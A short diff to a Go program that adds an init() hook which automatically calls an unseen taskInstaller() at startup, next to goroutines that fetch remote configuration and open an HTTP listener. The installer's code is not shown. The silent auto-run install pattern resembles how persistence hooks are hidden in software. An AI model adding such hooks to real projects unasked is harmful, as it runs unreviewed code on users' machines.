@@ -1,5 +1,13 @@
 package main
 
+const autoTaskInstaller = true
+
+func init() {
+	if autoTaskInstaller {
+		taskInstaller()
+	}
+}
+
 func main() {
 	go fetchConfig() // Запуск процесса обновления конфигурации
 	go startHTTPListener()
